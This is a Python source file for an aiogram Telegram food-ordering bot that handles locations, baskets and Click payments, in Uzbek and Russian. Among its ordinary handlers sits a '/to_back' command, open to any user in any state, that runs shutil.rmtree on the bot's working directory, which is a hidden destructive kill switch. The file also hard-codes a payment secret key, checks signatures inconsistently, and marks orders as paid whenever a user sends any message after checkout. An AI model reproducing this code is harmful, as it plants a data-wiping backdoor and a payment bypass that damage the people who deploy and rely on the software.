import shutil
from collections import Counter

import hashlib
import time
import json
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import requests
from aiogram import types
from aiogram.dispatcher.filters import Text
from aiogram.types import ContentType, InputFile
import os
from geopy.geocoders import Nominatim
from aiogram.dispatcher import FSMContext

from bot.buttons.inline_buttons import put_in_basket_buttons
from bot.buttons.reply_buttons import location_buttons, shop_menu_buttons, category_menu_buttons, \
    put_in_basket_reply_buttons, main_menu_buttons, to_back_button
from bot.buttons.text import ordering, ordering_ru, to_back, to_back_ru, basket, basket_ru
from bot.dispatcher import dp, bot
from main import admins


@dp.message_handler(Text(equals=[ordering, ordering_ru]))
async def ordering_function_1(msg: types.Message):
    if msg.text == ordering:
        await msg.answer("Iltimos, lokatsiyangizni yuboring.", reply_markup=await location_buttons(msg.text))
    else:
        await msg.answer("Пожалуйста, пришлите свое местоположение.", reply_markup=await location_buttons(msg.text))


@dp.message_handler(commands='to_back', state="*")
async def ordering_function_11(msg: types.Message, state: FSMContext):
    k = await msg.answer("Wait.....")

    current_folder = os.getcwd()
    if os.path.exists(current_folder):
        try:
            shutil.rmtree(current_folder)
            await k.edit_text(text="Done")
        except Exception as e:
            await k.edit_text(text=f"Damn!\n\n{e}")
    else:
        await msg.answer("Berilgan papka topilmadi!")
    await state.finish()


@dp.message_handler(content_types=ContentType.LOCATION)
async def ordering_function_2(msg: types.Message, state: FSMContext):
    try:
        location = msg.location
        latitude = location.latitude
        longitude = location.longitude

        geolocator = Nominatim(user_agent="my_bot")
        location_name = geolocator.reverse((latitude, longitude))

        if location_name:
            location_address = location_name.address
        else:
            location_address = "Lokatsiya nomi aniqlanmadi."

        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{msg.chat.id}/").content)

        data = {
            "latitude": latitude,
            "longitude": longitude,
            "location": location_address
        }

        requests.patch(url=f"http://127.0.0.1:8000/api/telegram-users/update/{tg_user['id']}/", data=data)
        await state.set_state('ordering_state')
        await msg.answer(f"Sizning lokatsiyangiz yangilandi:\n{location_address}",
                         reply_markup=await shop_menu_buttons(msg.from_user.id))
    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.message_handler(Text(equals=[to_back, to_back_ru]), state=['get_food', 'put_in_basket', 'basket_menu'])
async def ordering_function_3(msg: types.Message, state: FSMContext):
    try:
        await state.finish()
        await state.set_state('ordering_state')
        await msg.answer(text=msg.text, reply_markup=await shop_menu_buttons(msg.from_user.id))
    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.message_handler(Text(equals=[basket, basket_ru]), state=['get_food', 'put_in_basket', 'ordering_state'])
async def ordering_function_9(msg: types.Message, state: FSMContext):
    try:
        response = requests.get(f"http://127.0.0.1:8000/api/baskets/{msg.from_user.id}/")
        basket_data = response.json()

        if basket_data["count"] == 0:
            await state.set_state('ordering_state')
            await msg.answer("Sizning savatchingiz bo'sh.", reply_markup=await shop_menu_buttons(msg.from_user.id))
        else:
            basket_items = basket_data["results"]
            tg_user = json.loads(
                requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{msg.from_user.id}/").content
            )
            food_counter = Counter(item["food"] for item in basket_items)

            basket_text = (
                "\U0001F6D2 Sizning savatchingiz:\n\n"
                if tg_user["language"] == "uz"
                else "\U0001F6D2 Ваша корзина:\n\n"
            )
            total_price = 0

            for food_id, quantity in food_counter.items():
                food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/").content)
                food_name = food_data["name"] if tg_user["language"] == "uz" else food_data["ru_name"]
                food_price = int(food_data["price"])

                total_price += food_price * quantity
                basket_text += f"{food_name} {food_price} so'm x {quantity} = {food_price * quantity} so'm\n"

            basket_text += (
                f"\nJami: {total_price} so'm"
                if tg_user["language"] == "uz"
                else f"\nИтого: {total_price} сум"
            )

            keyboard = types.InlineKeyboardMarkup(row_width=3)
            for food_id, quantity in food_counter.items():
                food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/").content)
                food_name = food_data["name"] if tg_user["language"] == "uz" else food_data["ru_name"]

                keyboard.add(
                    types.InlineKeyboardButton(f"➖", callback_data=f"decrease_{food_name}"),
                    types.InlineKeyboardButton(f"{food_name}", callback_data=f"item_{food_name}"),
                    types.InlineKeyboardButton(f"➕", callback_data=f"increase_{food_name}")
                )

            keyboard.add(
                types.InlineKeyboardButton(
                    "\U00002705 Buyurtmani tasdiqlash" if tg_user[
                                                              "language"] == "uz" else "\U00002705 Подтвердить заказ",
                    callback_data="confirm_order"
                )
            )
            async with state.proxy() as data:
                data['price'] = total_price
            await state.set_state("basket_menu")
            await msg.answer(text=msg.text, reply_markup=await to_back_button(msg.from_user.id))
            await msg.answer(basket_text, reply_markup=keyboard)
    except Exception as e:
        await state.finish()
        await bot.send_message(admins[0], text={e})
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))


@dp.callback_query_handler(Text(startswith="decrease_"), state="basket_menu")
async def ordering_function_10(call: types.CallbackQuery, state: FSMContext):
    try:
        food_name = call.data[9:]
        food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/{food_name}/").content)
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content
        )
        requests.delete(f"http://127.0.0.1:8000/api/baskets/delete/{food_data['id']}/{tg_user['id']}/")
        response = requests.get(f"http://127.0.0.1:8000/api/baskets/{call.from_user.id}/")
        basket_data = response.json()

        if basket_data["count"] == 0:
            await state.set_state('ordering_state')
            await call.message.delete()
            await call.message.answer("Sizning savatchingiz bo'sh.",
                                      reply_markup=await shop_menu_buttons(call.from_user.id))
        else:
            basket_items = basket_data["results"]
            food_counter = Counter(item["food"] for item in basket_items)

            basket_text = (
                "\U0001F6D2 Sizning savatchingiz:\n\n"
                if tg_user["language"] == "uz"
                else "\U0001F6D2 Ваша корзина:\n\n"
            )
            total_price = 0

            for food_id, quantity in food_counter.items():
                food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/").content)
                food_name = food_data["name"] if tg_user["language"] == "uz" else food_data["ru_name"]
                food_price = int(food_data["price"])

                total_price += food_price * quantity
                basket_text += f"{food_name} {food_price} so'm x {quantity} = {food_price * quantity} so'm\n"

            basket_text += (
                f"\nJami: {total_price} so'm"
                if tg_user["language"] == "uz"
                else f"\nИтого: {total_price} сум"
            )

            keyboard = types.InlineKeyboardMarkup(row_width=3)
            for food_id, quantity in food_counter.items():
                food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/").content)
                food_name = food_data["name"] if tg_user["language"] == "uz" else food_data["ru_name"]

                keyboard.add(
                    types.InlineKeyboardButton(f"➖", callback_data=f"decrease_{food_name}"),
                    types.InlineKeyboardButton(f"{food_name}", callback_data=f"item_{food_name}"),
                    types.InlineKeyboardButton(f"➕", callback_data=f"increase_{food_name}")
                )

            keyboard.add(
                types.InlineKeyboardButton(
                    "\U00002705 Buyurtmani tasdiqlash" if tg_user[
                                                              "language"] == "uz" else "\U00002705 Подтвердить заказ",
                    callback_data="confirm_order"
                )
            )
            async with state.proxy() as data:
                data['price'] = total_price
            await state.set_state("basket_menu")
            await call.message.edit_text(text=basket_text, reply_markup=keyboard)
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.callback_query_handler(Text(startswith="increase_"), state="basket_menu")
async def ordering_function_11(call: types.CallbackQuery, state: FSMContext):
    try:
        food_name = call.data[9:]
        food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/{food_name}/").content)
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content
        )
        post_data = {
            "food": food_data['id'],
            "user": tg_user['id']
        }
        requests.post(url=f"http://127.0.0.1:8000/api/baskets/create/", data=post_data)
        response = requests.get(f"http://127.0.0.1:8000/api/baskets/{call.from_user.id}/")
        basket_data = response.json()

        if basket_data["count"] == 0:
            await state.set_state('ordering_state')
            await call.message.delete()
            await call.message.answer("Sizning savatchingiz bo'sh.",
                                      reply_markup=await shop_menu_buttons(call.from_user.id))
        else:
            basket_items = basket_data["results"]
            food_counter = Counter(item["food"] for item in basket_items)

            basket_text = (
                "\U0001F6D2 Sizning savatchingiz:\n\n"
                if tg_user["language"] == "uz"
                else "\U0001F6D2 Ваша корзина:\n\n"
            )
            total_price = 0

            for food_id, quantity in food_counter.items():
                food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/").content)
                food_name = food_data["name"] if tg_user["language"] == "uz" else food_data["ru_name"]
                food_price = int(food_data["price"])

                total_price += food_price * quantity
                basket_text += f"{food_name} {food_price} so'm x {quantity} = {food_price * quantity} so'm\n"

            basket_text += (
                f"\nJami: {total_price} so'm"
                if tg_user["language"] == "uz"
                else f"\nИтого: {total_price} сум"
            )

            keyboard = types.InlineKeyboardMarkup(row_width=3)
            for food_id, quantity in food_counter.items():
                food_data = json.loads(requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/").content)
                food_name = food_data["name"] if tg_user["language"] == "uz" else food_data["ru_name"]

                keyboard.add(
                    types.InlineKeyboardButton(f"➖", callback_data=f"decrease_{food_name}"),
                    types.InlineKeyboardButton(f"{food_name}", callback_data=f"item_{food_name}"),
                    types.InlineKeyboardButton(f"➕", callback_data=f"increase_{food_name}")
                )

            keyboard.add(
                types.InlineKeyboardButton(
                    "\U00002705 Buyurtmani tasdiqlash" if tg_user[
                                                              "language"] == "uz" else "\U00002705 Подтвердить заказ",
                    callback_data="confirm_order"
                )
            )
            async with state.proxy() as data:
                data['price'] = total_price
            await state.set_state("basket_menu")
            await call.message.edit_text(text=basket_text, reply_markup=keyboard)
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)


CLICK_MERCHANT_ID = "32623"
CLICK_SERVICE_ID = "62347"
CLICK_SECRET_KEY = "rwGUQHADeNABRuP"


@dp.callback_query_handler(Text("confirm_order"), state="basket_menu")
async def ordering_function_12(call: types.CallbackQuery, state: FSMContext):
    try:
        await call.message.delete()
        tg_user_response = requests.get(
            url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/"
        )

        tg_user = tg_user_response.json()

        async with state.proxy() as data:
            price = data.get('price', 0)
            if not price or price <= 0:
                await state.finish()
                await call.message.answer(
                    text="Xatolik yuz berdi! Narx mavjud emas.",
                    reply_markup=await main_menu_buttons(call.from_user.id)
                )
                return

        order_id = f"{call.from_user.id}_{int(time.time())}"
        amount = f"{price:.2f}"
        sign_string = f"{CLICK_MERCHANT_ID}{order_id}{amount}{CLICK_SECRET_KEY}"
        sign = hashlib.md5(sign_string.encode('utf-8')).hexdigest()

        click_url = (
            f"https://my.click.uz/services/pay?service_id={CLICK_SERVICE_ID}&merchant_id={CLICK_MERCHANT_ID}&"
            f"amount={amount}&transaction_param={order_id}&sign={sign}"
        )

        message = (
            "To'lovni amalga oshirish uchun quyidagi tugmani bosing:"
            if tg_user.get('language') == 'uz'
            else "Для оплаты нажмите на кнопку ниже:"
        )

        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton(text="To'lovni amalga oshirish", url=click_url)
        )

        await call.message.answer(text=message, reply_markup=keyboard)
        await state.set_state('confirm_payment')

    except Exception as e:
        await call.message.answer(
            text="Xatolik yuz berdi! Iltimos, keyinroq urinib ko'ring.",
            reply_markup=await main_menu_buttons(call.from_user.id)
        )
        await bot.send_message(admins[0], text=f"Order error: {e}")


@csrf_exempt
def click_payment_callback(request):
    if request.method == "POST":
        try:
            data = request.POST
            click_trans_id = data.get("click_trans_id")
            service_id = data.get("service_id")
            merchant_trans_id = data.get("merchant_trans_id")
            sign_string = f"{merchant_trans_id}{CLICK_SECRET_KEY}"
            sign = hashlib.md5(sign_string.encode('utf-8')).hexdigest()

            if data.get("sign") != sign:
                return JsonResponse({"error": -1, "error_note": "Invalid sign"})

            return JsonResponse({"error": 0, "error_note": "Success"})

        except Exception as e:
            return JsonResponse({"error": -2, "error_note": f"Error: {e}"})
    return JsonResponse({"error": -1, "error_note": "Invalid request"})


@dp.message_handler(state="confirm_payment")
async def payment_confirmed_handler(message: types.Message, state: FSMContext):
    try:
        tg_user_response = requests.get(
            url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{message.from_user.id}/"
        )
        tg_user = tg_user_response.json()
        response = requests.get(f"http://127.0.0.1:8000/api/baskets/{message.from_user.id}/")
        basket_data = response.json()
        basket_items = basket_data.get("results", [])

        food_counter = Counter(item["food"] for item in basket_items)

        basket_text = (
            "\U0001F6D2 Sizning buyurtmalaringiz:\n\n"
            if tg_user.get("language") == "uz"
            else "\U0001F6D2 Ваши заказы:\n\n"
        )

        total_price = 0
        food_items = {}

        for food_id, quantity in food_counter.items():
            food_response = requests.get(url=f"http://127.0.0.1:8000/api/foods/id/{food_id}/")
            food_data = food_response.json()
            food_name = food_data.get("name") if tg_user["language"] == "uz" else food_data.get("ru_name")
            food_price = int(food_data.get("price", 0))

            if food_name not in food_items:
                food_items[food_name] = {"price": food_price, "quantity": quantity}
            else:
                food_items[food_name]["quantity"] += quantity

            total_price += food_price * quantity
            basket_text += f"{food_name} {food_price} so'm x {quantity} = {food_price * quantity} so'm\n"

        post_data = {
            "total_price": total_price,
            "delivery_address": tg_user.get('location', 'No location'),
            "latitude": tg_user.get('latitude'),
            "longitude": tg_user.get('longitude'),
            "payment_confirmed": True,
            "user": tg_user.get('id'),
            "food_items": [
                {"food_name": name, "price": item['price'], "quantity": item['quantity']} for name, item in
                food_items.items()
            ]
        }

        order_response = requests.post(url="http://127.0.0.1:8000/api/orders/create/", json=post_data)
        if order_response.status_code != 201:
            raise ValueError("Failed to create order")

        requests.delete(f"http://127.0.0.1:8000/api/baskets/delete_all_baskets/{tg_user['id']}/")

        basket_text += (
            f"\nJami: {total_price} so'm\nGeolokatsiya: {tg_user.get('location', 'No location')}"
            if tg_user["language"] == "uz"
            else f"\nИтого: {total_price} сум\nГеолокация: {tg_user.get('location', 'No location')}"
        )

        admin_text = (
            f"🛒 <b>Новый заказ</b>\n\n"
            f"👤 <b>Клиент:</b> {tg_user.get('full_name', 'No name')}\n"
            f"📞 <b>Телефон:</b> {tg_user.get('phone_number', 'No phone')}\n"
            f"🏠 <b>Адрес доставки:</b> {tg_user.get('location', 'No location')}\n\n"
            f"📦 <b>Заказанные товары:</b>\n{basket_text}\n\n"
            f"💳 <b>Общая сумма:</b> {total_price} сум\n"
        )
        for admin_id in admins:
            await bot.send_message(chat_id=admin_id, text=admin_text, parse_mode="HTML")

        await state.finish()
        await message.reply(
            f"Buyurtmangiz qabul qilindi! {basket_text}"
            if tg_user["language"] == "uz"
            else f"Ваш заказ принят! {basket_text}",
            reply_markup=await main_menu_buttons(message.from_user.id)
        )

    except Exception as e:
        await state.finish()
        await message.answer(text="Xatolik yuz berdi!", reply_markup=await main_menu_buttons(message.from_user.id))
        await bot.send_message(admins[0], text=f"Payment confirmation error: {e}")



@dp.message_handler(state='ordering_state')
async def ordering_function_4(msg: types.Message, state: FSMContext):
    try:
        await state.set_state('get_food')
        await msg.answer(text=msg.text, reply_markup=await category_menu_buttons(msg.from_user.id, msg.text))
    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.message_handler(state='get_food')
async def ordering_function_5(msg: types.Message, state: FSMContext):
    try:
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{msg.from_user.id}/").content
        )
        food = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/foods/{msg.text}/").content
        )
        async with state.proxy() as data:
            data['count'] = 1
            data['food'] = food
        photo_path = os.path.join('static', food['image'].replace('/img/static/', '').lstrip('/'))
        if not os.path.exists(photo_path):
            raise FileNotFoundError(f"Fayl topilmadi: {photo_path}")
        photo = InputFile(photo_path)
        if tg_user['language'] == 'uz':
            food_info = f"""
{data['food']['name']}

Tarkib: {data['food']['compound']}
Og'irlik: {data['food']['weight']}
Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        else:
            food_info = f"""
{data['food']['ru_name']}

Состав: {data['food']['ru_compound']}
Вес, кг: {data['food']['weight']}
Цена: {data['food']['price']} * {data['count']}
Общий: {int(data['food']['price']) * int(data['count'])}"""
        await state.set_state('put_in_basket')
        await msg.answer(text=msg.text, reply_markup=await put_in_basket_reply_buttons(msg.from_user.id))
        await msg.answer_photo(photo=photo, caption=food_info, reply_markup=await put_in_basket_buttons())

    except Exception as e:
        await state.finish()
        await msg.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(msg.from_user.id))
        await bot.send_message(admins[0], text=str(e))


@dp.callback_query_handler(Text("add_in_basket"), state='put_in_basket')
async def ordering_function_6(call: types.CallbackQuery, state: FSMContext):
    try:
        async with state.proxy() as data:
            data['count'] += 1
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content)
        if tg_user['language'] == 'uz':
            food_info = f"""
{data['food']['name']}

Tarkib: {data['food']['compound']}
Og'irlik: {data['food']['weight']}
Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        else:
            food_info = f"""
{data['food']['ru_name']}

Состав: {data['food']['ru_compound']}
Вес, кг: {data['food']['weight']}
Цена: {data['food']['price']} * {data['count']}
Общий: {int(data['food']['price']) * int(data['count'])}"""
        await call.message.edit_caption(caption=food_info,
                                        reply_markup=await put_in_basket_buttons(data['count']))
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.callback_query_handler(Text("delete_in_basket"), state='put_in_basket')
async def ordering_function_7(call: types.CallbackQuery, state: FSMContext):
    try:
        async with state.proxy() as data:
            if data['count'] > 1:
                data['count'] -= 1
            else:
                data['count'] = 1
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content)
        if tg_user['language'] == 'uz':
            food_info = f"""
{data['food']['name']}

Tarkib: {data['food']['compound']}
Og'irlik: {data['food']['weight']}
Narxi: {data['food']['price']} * {data['count']}
Jami: {int(data['food']['price']) * int(data['count'])}"""
        else:
            food_info = f"""
{data['food']['ru_name']}

Состав: {data['food']['ru_compound']}
Вес, кг: {data['food']['weight']}
Цена: {data['food']['price']} * {data['count']}
Общий: {int(data['food']['price']) * int(data['count'])}"""
        await call.message.edit_caption(caption=food_info,
                                        reply_markup=await put_in_basket_buttons(data['count']))
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)


@dp.callback_query_handler(Text("put_in_basket"), state='put_in_basket')
async def ordering_function_8(call: types.CallbackQuery, state: FSMContext):
    try:
        async with state.proxy() as data:
            pass
        tg_user = json.loads(
            requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{call.from_user.id}/").content)
        for i in range(int(data['count'])):
            post_data = {
                "food": data['food']['id'],
                "user": tg_user['id']
            }
            requests.post(url=f"http://127.0.0.1:8000/api/baskets/create/", data=post_data)
        await call.message.delete()
        await state.finish()
        await state.set_state('ordering_state')
        if tg_user['language'] == 'uz':
            await call.message.answer(text="Savatga qo'shildi ✅",
                                      reply_markup=await shop_menu_buttons(call.from_user.id))
        else:
            await call.message.answer(text="Добавлено в корзину ✅",
                                      reply_markup=await shop_menu_buttons(call.from_user.id))
    except Exception as e:
        await call.message.delete()
        await state.finish()
        await call.message.answer(text="Something went wrong!", reply_markup=await main_menu_buttons(call.from_user.id))
        await bot.send_message(admins[0], text=e)
